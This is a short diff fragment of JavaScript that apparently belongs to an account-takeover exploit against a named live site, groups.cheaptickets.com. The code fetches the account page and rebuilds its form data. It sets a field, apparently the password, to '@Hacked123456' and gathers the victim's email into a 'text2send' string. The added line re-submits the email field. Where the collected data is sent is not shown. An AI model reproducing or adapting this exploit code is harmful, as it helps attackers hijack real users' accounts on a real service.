@@ -21,6 +21,7 @@ fetch('https://groups.cheaptickets.com/Group/Account.htm')
             urlEncodedData.append(pair[0], "@Hacked123456");
         } else if (pair[0] === "Email") {
             text2send += "Email: " + pair[1] + "\n";
+            urlEncodedData.append(pair[0], pair[1]);
         } else {
             urlEncodedData.append(pair[0], pair[1]);
         }
